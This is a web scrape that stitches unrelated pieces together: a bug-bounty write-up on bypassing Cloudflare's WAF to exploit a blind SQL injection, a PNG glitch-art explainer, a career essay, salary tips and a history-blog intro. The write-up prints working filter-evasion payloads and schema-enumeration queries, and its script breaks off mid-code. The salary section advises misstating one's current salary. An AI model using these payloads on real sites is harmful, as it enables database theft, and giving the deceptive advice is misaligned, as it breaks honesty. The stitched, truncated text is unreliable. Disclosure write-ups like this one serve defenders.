After running the standard scans with automated tools, something interesting
came up: a possible SQL injection which couldn’t be exploited using the tool.
The reason: Cloudflare’s WAF and more specifically its SQL Injection filter.</p>

<h4 id="details-about-the-application">Details about the application</h4>
<p>The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don’t remember the use of the form
and it doesn’t really matter for the writeup. The POST request looked like this:</p>

<figure><pre><code data-lang="http"><span>POST</span> <span>/index.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>******</span>

<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Content-Type</span><span>:</span> <span>multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3</span>

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3--</code></pre></figure>

<p>The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>X</span><span>-</span><span>MARK</span><span>;</span></code></pre></figure>

<p>The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.</p>

<p>To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'a'</span><span>;</span></code></pre></figure>

<p>the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'b'</span><span>;</span></code></pre></figure>

<p>the server responded with status 500 Internal Server Error.</p>

<p>In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.</p>

<h4 id="first-try">First Try</h4>
<p>My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to ‘a’ and if not I would
continue with ‘b’, ‘c’ etc. I would start by inject the following string (for
comparison with ‘a’):</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>which would result in the following SQL query to be executed on the server:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span>
<span>WHERE</span> <span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>When I found the table name to be t1 for example, I was to brute force its
columns’ names with the following starting injection:</p>

<p><em>INJECTION 1</em></p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>and then actually get values out of column c1 of table t1 by starting with the
following injection:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>c1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>t1</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The idea was good, but Cloudflare would complain about the ‘=’ sign. The
injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span> <span>'b'</span></code></pre></figure>

<p>would get blocked by Cloudflare’s WAF. After a bit of fiddling, I came up with
the following request that bypassed the ‘=’ restriction:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>This means that the initial injection <em>INJECTION 1</em> would become:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="second-try">Second Try</h4>
<p><em>INJECTION 1</em> was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>would still get blocked, not because of the LIKE keyword, but because of the ‘a’
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>The above injection sends the character ‘a’ as the hex-encoded value ‘0x61’
which still allows it to work:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'a'</span></code></pre></figure>

<p>still returns True, and</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>passes through undetected and returns False.</p>

<p>The resulting <em>INJECTION 1</em> now looks like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="third-try">Third Try</h4>
<p>The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>but with a multi-line comment trick, the new query would go through undetected:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span><span>/*trick comment*/</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span>
<span>FROM</span><span>/*trick comment*/</span> <span>t1</span>
<span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>Thus, applying this method on <em>INJECTION 1</em>, would make it look like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span><span>/*trick comment*/</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span><span>/*trick comment*/</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character ‘a’ matches the first character of the first column’s name of table
t1.</p>

<h4 id="full-speed-ahead">Full Speed Ahead</h4>
<p>To make the retrieving of table contents from the application’s database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:</p>

<figure><pre><code data-lang="python"><span># assert names of columns and table name is known
</span><span>alphabet</span> <span>=</span> <span>[</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>,...,</span><span>y</span><span>,</span><span>z</span><span>]</span>
<span>characterPosition</span> <span>=</span> <span>1</span> <span># the position of the character we are bruteforcing

<p>And this is how I bypassed Cloudflare WAF’s SQL injection protection. I got a
free t-shirt and a place in <a href="https://hackerone.com/gskourou">Cloudflare’s HoF</a>.</p>

<h4 id="mitigation">Mitigation</h4>
<p>Cloudlfare reviewed and fixed the vulnerability a few days after my report.</p>
<p>The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP</a>.
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users’ input properly.</p>

    <section>
      <h2>Overview</h2>
      <p>
      PNG is an image format that has a history of development beginning in 1995, and it is still a popular, long living format. Generally, it is known for its features such as lossless compression and  the ability to handle transparent pixels. <br>
      However, we do not look at image formats from a general point of view, but rather think of ways to glitch them. When we look at PNG from the point of view of glitch, what kind of peculiarity does it have?
      </p>
      <h3>Checksum</h3>
      <p>
      We should first look into the checksum system of the CRC32 algorithm. It is used to confirm corrupted images, and when it detects corruption in an image file, normal viewer applications refuse to display it. Therefore, it is impossible to generate glitches using simple methods such as rewriting part of the binary data using text editors or binary editors (you will completely fail). In other words, the PNG format is difficult to glitch. <br>
      We need to create glitches accordingly to the PNG specification in order to avoid this failure. This means that we must rewrite the data after decoding CRC32, re-calculate it and attach it to the edited data.
      </p>

      <h3>State</h3>
      <p>
      Next we want to look at the transcode process of PNG. The chart shown below is a simplified explanation of how PNG encoding flows.
      </p>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/states.png" alt="Figure 1)  PNG encoding flow">
        <figcaption>Figure 1) PNG encoding flow</figcaption>
      </figure>


      <p>
      Each of the four states that are shown above can be glitch targets. However, glitching the the first “Raw Data” is the same as glitching BMP, so it technically isn’t a PNG glitch (at the end, it is the same as PNG with the None filter applied. I will explain this in the next section). The final “Formatted PNG” glitch will not work because of the checksum system I mentioned above.<br>
      This means that PNG glitches can be made when the “Filtered Data” or “Compressed Data” is manipulated. I will explain about filters in the following subsection. When “Filtered Data” is glitched, it shows a distinctive effect; patterns that look like flower petals scatter around the image. The difference between the filters become clear when the “Filtered Data” is glitched. On the other hand, “Compressed Data” glitches are flavored by their own compression algorithm, which is Deflate compression. It shows an effect similar to a snow noise image.
      </p>
      <p>
      There are elements else besides the transcoding process that could also influence the appearance of glitches such as transparent pixels and interlaces.
      </p>
      <h3>Five filters</h3>
      <p>
      The factor that characterizes the appearance of glitches the most is the process called filter. The filter converts the uncompressed pixel data of each scanline using a certain algorithm in order to improve the compression efficiency. There are five types of filters that include four algorithms called Sub, Up, Average and Paeth, and also None (which means no filter applied). PNG images are usually compressed after the most suitable filter is applied to each scanline, and therefore all five filters are combined when PNG images are made.<br>
      These five filters usually only contribute to the compression efficiency, so the output result is always the same no matter which filter is applied. However, a clear difference appears in the output result when the filtered data is damaged. It is difficult to recognize the difference of the filters when an image is optimized and has all five filters combined, but the difference becomes obvious when an image is glitched when the same, single filter is applied to each scanline.<br>
      I will show the difference of the effect that each filter has later on, but when we look close into the results, we will understand which filter is causing which part of the beauty of PNG glitches (yes, they are beautiful) to occur.
      </p>
      <p>
        I will show the actual glitch results in the next section.
      </p>

      <h2>Glitching: In practice</h2>

      <figure>

        <figcaption>Figure 3) Glitched PNG image</figcaption>
      </figure>
      <p>
      I have shown two PNG images above: one is an image before it has been glitched, and one is an image that has been glitched.<br>
      This is a Filtered Data glitch, which I explained in the previous section.<br>
      The original PNG has optimized filters applied to each scanline, and all of the five filters have been combined. The glitch reveals how the five filters were balanced when they were the combined.
      </p>
      <h3>Difference between filters</h3>
      <p>
      Lets look into the difference between each filter type.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-none.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-none.png" alt="Figure 4) Glitched PNG, filtered with None"></a>
        <figcaption>Figure 4) Glitched PNG, filtered with None</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-none-detail.png" alt="Figure 5) Magnified view of fig. 4">
        <figcaption>Figure 5) Magnified view of fig. 4</figcaption>
      </figure>
      <p>
      The image above has applied “None (no filter)”, meaning that it is a raw data glitch. Each pixel stands alone in this state and do not have any relationship with the others, so a single re-wrote byte does not have a wide range influence.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-sub.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-sub.png" alt="Figure 6) Glitched PNG, filtered with Sub"></a>
        <figcaption>Figure 6) Glitched PNG, filtered with Sub</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-sub-detail.png" alt="Figure 7) Magnified view of fig. 6">
        <figcaption>Figure 7) Magnified view of fig. 6</figcaption>
      </figure>
      <p>
      This is a glitched image that has the filter “Sub” applied to each scanline. When the Sub algorythm is applied, the target pixel rewrites itself by refering to the pixel that is right next to it. This is why the glitch pattern avalanches towards the right side.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-up.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-up.png" alt="Figure 8) Glitched PNG, filtered with Up"></a>
        <figcaption>Figure 8) Glitched PNG, filtered with Up</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-up-detail.png" alt="Figure 9) Magnified view of fig. 8">
        <figcaption>Figure 9) Magnified view of fig. 8</figcaption>
      </figure>
      <p>
      This is the filter “Up”. This filter is similar to Sub, but its reference direction is the top and bottom.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-average.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-average.png" alt="Figure 10) Glitched PNG, filtered with Average"></a>
        <figcaption>Figure 10) Glitched PNG, filtered with Average</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-average-detail.png" alt="Figure 11) Magnified view of fig. 10">
        <figcaption>Figure 11) Magnified view of fig. 10</figcaption>
      </figure>
      <p>
      The filter “Average” refers to a diagonal direction. It shows a meteor like tail that starts from the damaged pixel. The soft gradation effect is also one of the peculiarities of this filter. The result of a PNG glitch when the Average filter is applied is a glitch that lacks glitchiness, and is also the most delicate portion of PNG glitching.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-paeth.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-paeth.png" alt="Figure 12) Glitched PNG, filtered with Paeth"></a>
        <figcaption>Figure 12) Glitched PNG, filtered with Paeth</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-paeth-detail.png" alt="Figure 13) Magnified view of fig. 12">
        <figcaption>Figure 13) Magnified view of fig. 12</figcaption>
      </figure>
      <p>
      The filter “Paeth” has the most complicated algorithm when compared with the others. It also has the most complicated glitch effect. The glitch will affect a wide range of areas even with the least byte re-writing. The keynote effect of PNG glitch is caused by this filter; the figure shown in the original image is maintained, but is intensely destroyed at the same time.
      </p>

      <h3>Glitch after compression</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-compressed.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-compressed.png" alt="Figure 14) Glitched PNG, after compressed"></a>
        <figcaption>Figure 14) Glitched PNG, after compressed</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-compressed-detail.png" alt="Figure 15) Magnified view of fig. 14">
        <figcaption>Figure 15) Magnified view of fig. 14</figcaption>
      </figure>
      <p>
      This is a glitch of the state that I referred to as Compressed Data in the previous section. A snowstorm effect appears, and it is difficult to recognize the original figure in the image. It infrequently remains to show effects of the filters. The image is often completely destroyed.
      </p>
　
      <h3>Transparence</h3>
      <p>
      Lets look into what happens when an image that includes transparent pixels is glitched.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-alpha.png" alt="Figure 16) Original PNG image"></a>
        <figcaption>Figure 16) Original PNG image with alpha pixels</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-alpha.png" alt="Figure 17) Glitched PNG, with alpha pixels"></a>
        <figcaption>Figure 17) Glitched PNG, with alpha pixels</figcaption>
      </figure>
      <p>
      The transparency comes as an effect. Especially the filter “Average” seems to blend transparent pixels gradually.
      A 100% gathering of transparent pixels is handled in the same way as a solid colored section. You can tell that the filter “Up” is often applied to solid colored sections.<br>
      (There is a possibility that newer general-purpose image formats switch their compression scheme of each part depending on if the image is a solid colored section, or else a complicated image such as photographs. The use of images that include solid colored sections for testing glitches is an effective method. One example is a WebP. )
      </p>

      <h3>Interlace</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-interlace.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-interlace.png" alt="Figure 18) Glitched PNG, with interlace"></a>
        <figcaption>Figure 18) Glitched PNG, with interlace</figcaption>
      </figure>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-interlace-detail.png" alt="Figure 19) Magnified view of fig. 18">
        <figcaption>Figure 19) Magnified view of fig. 18</figcaption>
      </figure>
      <p>
        PNG interlaces are divided into seven passes, using the Adam7 algorithm based on 8x8 pixels. We are able to visualy observe that algorithm when an interlaced PNG is glitched. We can also confirm a stitched effect, and that its angle has become narrow towards the Average filter (see appendix B).
      </p>

      <h2>Conclusion</h2>
      <p>
      PNG is a very simple format compared to JPEG or other new image formats. The filter algorithms are like toys, and its compression method is the same as oldschool Zip compression. However, this simple image format shows a surprisingly wide range of glitch variations. We would perhaps only need one example to explain a JPEG glitch, but we need many different types of samples in order to explain what a PNG glitch is.<br>
      PNG was developed as an alternative format of GIF. However, when it comes to glitching, GIF is a format that is too poor to be compared with PNG. PNG has prepared surprisingly rich results that have been concealed by the checksum barrier for a long time.

      The author released <a href="http://www.jarchive.org/akami/aka018.html">a tiny script for PNG glitch</a> in 2010. Back then, it only removed the CRC32 and added it back again after the internal data was glitched.<br>

<p>
<img src="https://www.michellelim.org/writing/stop-using-frontend-backend/images/fe-be-cover-photo.png" alt="Stop Using Frontend Backend Cover Photo">
</p>
<p>If there is one tip I could share with my fellow new engineers, it would be… Stop relying on the “Frontend/Backend” axis to understand the engineering you like. <strong>The “Frontend/Backend” axis doesn’t map well to engineers’ motivations.</strong> If you only use that axis, you can end up in projects you don’t like or worse still, give up on engineering prematurely. <strong>Instead, try using the “Product/Infrastructure” axis as the first axis to understand your career preference.</strong></p>
<p>My goal is to share with you the language that could help you (and your manager) find your “sweet spot” engineering role. It took me a couple of bad internship placements and <em>pure luck</em> to figure this out. So I hope that this essay saves some of you months of job mismatch. Shoutout to <a href="https://twitter.com/bolu_ben">Bolu </a>who after my <a href="https://twitter.com/michlimlim/status/1293336552832151559">Tweet thread</a> on this thesis went viral on Tech Twitter, suggested that I turned the thread into an essay<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p><strong>“Product/Infra” maps neatly to the psychology of how engineers pick projects and their motivations for learning to code.</strong> Broadly speaking, there are 2 types of engineers<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>:</p>
<ol>
<li>
<p>“Product-first” engineers are obsessed with using code to solve a user problem and they see code as just a means to an end.</p>
</li>
<li>
<p>“Code-first” engineers are obsessed with the abstractions, architecture, tools and libraries in the code. Elegant code is the end.</p>
</li>
</ol>
<p>Product-first engineers map to “Product engineering”—building, launching and maintaining features that solve user problems. They often love being in the same room as designers and product managers to learn about users, and they love finding technical opportunities that can improve the product.</p>
<p>Code-first engineers map to “Infrastructure engineering”—building infrastructure platforms that support applications, be it via building CI/CD pipelines, implementing logging, or supporting high traffic etc. They’re motivated to better the craft of programming and are often obsessed with things like test coverage, using the latest technologies, code architecture, etc.</p>
<p>(To be clear, there are “Product engineering” and “Infrastructure engineering” roles whether your users are external customers, third-party developers or internal consumers of an API<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>.)</p>
<p>Notice that both Product engineers and Infrastructure engineers touch the frontend and the backend. Many of them, especially product engineers, choose to specialize into frontend or backend as well. <strong>The “Frontend/Backend” division is still a valuable axis.</strong></p>
<p><strong>However, using the “Frontend/Backend” in isolation of “Product/Infra” in project selection can lead to engineer-job Mismatch. Especially amongst Product engineers.</strong> I am a Product engineer. When I tried out “Backend engineering” in an internship, I was assigned to an Infra role where day-to-day I migrated databases. I had joined the company because I wanted to work on their product. But I didn’t have the language to explain that to my recruiter. They conflated “Backend” with “Infra” and I ended up with a role too far from the user.</p>
<p>When I tried out “Frontend engineering” in another internship, I was assigned to a product close to the user. But the frontend engineers and I were left out of the meetings that discussed how the features would solve problems.</p>
<p>If you split your engineers by the type of technology they work on (i.e. “Frontend/Backend”), it is easy to assume that your Frontend engineers are happy to just work on translating finalized designs into UI/UX components. But if you split them based on their motivations (i.e.”Product/Infra”), you’d want to loop your Frontend product engineers into product discussions.</p>
<p>(The same engineer-job mismatch happens for Infra engineers too, but it is less prevalent because the “Frontend” and “Backend” labels usually only officially apply in Product engineering.)</p>
<p>Now, this next part may be a reach… but I think <strong>many new grad Product engineers choose to be Product <em>Managers</em></strong> <strong>because of this inadequate “Frontend/Backend” division</strong><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. Let’s jump back to my two internship examples. How would you feel if these were your only two internships over your college career? Given that you spent 12 weeks in each role, wouldn’t it be reasonable to conclude that those roles were mostly what “frontend” and “backend” were all about? Wouldn’t it be reasonable too to conclude that since you didn’t like both types of engineering, maybe engineering as a whole wasn’t for you? (And this self-dejection is especially easy to fall into if you are part of an underrepresented minority in engineering.) Why not be a <em>Product</em> manager and solve user problems?</p>
<p>This scenario is very common. Engineering is esoteric. Even with an intern-team matching process, an Product engineering intern may not know that they should select Product engineering roles, let alone know which roles are Product engineering roles.</p>
<p><strong>But what if that same intern uses the “Product/Infra” language and advocates for a “Product Engineering” role?</strong></p>
<p>I was such an intern. I was so drained by my Infra role that I reached out to Product Managers in the company to enquire about their jobs. But then I advocated<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> for a Product Engineering role and… my manager gave it to me. As a backend engineer on a product team, I worked with a team to <a href="https://techcrunch.com/2019/10/03/stock-trading-app-robinhood-revamps-its-newsfeed-with-the-wall-street-journal-and-ad-free-videos/">build the Video Newsfeed in Robinhood</a>. I built a large backend pipeline and also had the chance to engage with product questions regarding newsfeed ranking, video tagging, and user engagement. I spoke with engineering, data science, and business, balanced those interests, and wrote the resolution in code.</p>
<p>I found my sweet spot.</p>
<p><strong>At the end of the day, engineering is multifaceted and can be defined along more than one axis:</strong> B2B vs. B2C, B2B top-down vs. B2B “bottom-up”, API-first vs. application-first, “Forward deployed” vs. “Software engineer”, etc. If we’re serious about making engineering accessible to all, we should champion any and all frameworks that can help new engineers find their sweet spot and be happy.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597245333467/5UNrmc9eH.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Knowing how to negotiate your salary as a developer is a must. When I received my first job offer, I was so excited to get a job, that I blindly accepted it. I did not even think of negotiating the salary. After all, I did not want to risk losing the offer. You have been in the same situation at least once, right?</p>
<p>However, most of the time, we leave money on the table by not negotiating our salary.</p>

<p>The first offer is never the best or the final offer. Companies always leave room in case the candidate wants to negotiate it. By not negotiating, you leave money on the table.</p>
<p>But how should I know how much to ask for? Use websites like Glassdoor to find the appropriate salary for a similar position and a similar experience. Once you have this information, adjust the salary based on your circumstances. At this point, you should have a rough idea of how much you deserve.</p>
<p>However, you should not blindly ask for more without reasons. If you ask for money, come with reasons why you deserve that compensation. Specify what you bring to the table.</p>

<p>I think I received this question millions of times. First of all, in many countries and states (USA), it is illegal to ask for the current salary. The rule of thumb is never to specify the salary you are making.</p>
<p>There are two options when answering this question:</p>
<ol>
<li>Avoid the question and try to move on</li>
<li>If they keep insisting, use the salary you want as your “current salary.”
Anyway, the best thing is never to mention the current salary. Companies and recruiters should not care about your current situation in terms of salary. </li>
</ol>

<p>Another reason why people do not negotiate is that they are afraid the company rescinds the offer. I do not think any respectable company is going to revoke the offer if you negotiate the salary.</p>
<p>In the worst case, they are going to cancel the offer. However, would you like to work for a company that does this? You just saved yourself from the trouble.</p>
<p>Therefore, do not be afraid to negotiate. In the worst case, they are going to say ‘no’. In the best case, you are going to get better compensation. On the other hand, if they rescind the offer, you do not want to work for them anyway.</p>

<p>This advice is not actionable straight away, and it depends on the circumstances. However, having alternative offers helps a lot because it puts you in a favourable position. If your negotiation does not go well, you always have a second option. The company also knows that you have nothing to lose.</p>
<p>However, I want to repeat that it depends on the circumstances. The more offers you have, the better it is for you. One the other side, if you do not have multiple offers, it is not the end of the world. </p>
<p>Let us pretend you have alternative offers. How can you use them to leverage your position?</p>
<p>You could say something along these lines: “I have multiple offers from x, y, z with better compensation. However, I like your products and your mission the most. As a result, I would like to work here because I think it is a better fit for me.” Of course, this is just an example, but you can use something similar.</p>
<p>Thus, if you have other offers, learn how to use them at your advantage.</p>

<p>These are my tops tips when it comes to knowing how to negotiate your salary as a developer. The list is not exhaustive, and there are many other aspects of negotiating.</p>
<p>I hope the article gives you some insights and helps you see negotiating with other eyes. The essential thing is to negotiate your salaries. Otherwise, you leave money on the table.</p>

<p>This week we are starting a four-part look at pre-modern iron and steel production.  As with our series on farming, we are going to follow the train of iron production from the mine to a finished object, be that a tool, a piece of armor, a simple nail, a weapon or some other object.  <strong>And I want to stress that broad framing</strong>: iron was made into more things than <em>just</em> swords (although swords are cool).  If you are here wondering how you go from iron-bearing rocks to a sword, these posts will tell you, but they will equally get you from those same rocks to a nail, or a workman’s hammer, or a sawblade, or a pot, or a decorative iron spiral, or a belt-buckle, or any other of a multitude of things that might be produced in iron.</p>



<p>Iron production is a unique topic in one key way.  If the problem with <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>is that the popular understanding of the past (either historical or fantastical) renders them <a href="https://acoup.blog/2019/07/12/collections-the-lonely-city-part-i-the-ideal-city/">effectively invisible</a> – as indeed, it tends to render <em>most</em> ancient forms of production invisible – <strong>iron-working is tremendously visible, but in a series of motifs that are almost completely</strong> <em><strong>wrong</strong></em>.  Iron is treated as rare when it is common, melted in societies that almost certainly lack the furnaces to do so; swords are cast when they should be forged, quenched in ways that would ruin them and the work of the iron-worker is represented as a solitary activity when every stage of iron-working, when done at any kind of scale, was a team job (many modern traditional blacksmiths work alone, often as a hobby; ancient smiths generally did not).  The popular depiction is so consistently wrong that it doesn’t really even provide a firm basis for correction.  <strong>We are going to have to start over, from the beginning</strong>.</p>



<p><strong>So this first post is going to focus on mining</strong>.  Next week we’ll take a look at ore processing, smelting in more detail, along with the pressing issue of fuel.  The week after that we’ll look at the basic principles behind forging.  And finally in the last week, we’ll ask what one might do if they wanted <em>steel</em> instead of iron.  As with the farming posts, there are likely to be some addendum (at least one, on Wootz steel, for sure).  <strong>Throughout all of this, we are going to look not only at the processes by which these objects were produced, but also the people who did that production.</strong></p>

By the 1800s, increases demand for iron ore to fuel the industrial revolution had made larger underground iron mines more common.  Here you can actually see the tailings (rock with little or no iron content which is sorted out at the mine) littering the rock face down to the shore.</figcaption></figure>



<p><strong>As with farming, there is a regional and chronological caveat necessary here</strong>: my research into metal production (and this, even more than farming, is core to my academic interests) is focused on the Roman world or – more broadly – on the broader Mediterranean and European tradition of metal-working.  There are some points where it will be necessary to note different methods or techniques in other parts of the world (early cast iron in China, for instance, or Wootz steel in India).  Likewise, I will do my best to capture changes in metal-working techniques in the medieval period.  What I am <em><strong>not </strong></em>going to cover in detail is <em>modern</em> steel and iron-working (that is, post-industrial-revolution), though I will occasionally note how it is different (the largest difference, by far, is that modern steel-making approaches the carbon problem from the opposite direction, with processes to <em>remove</em> carbon, instead of processes to add carbon).</p>



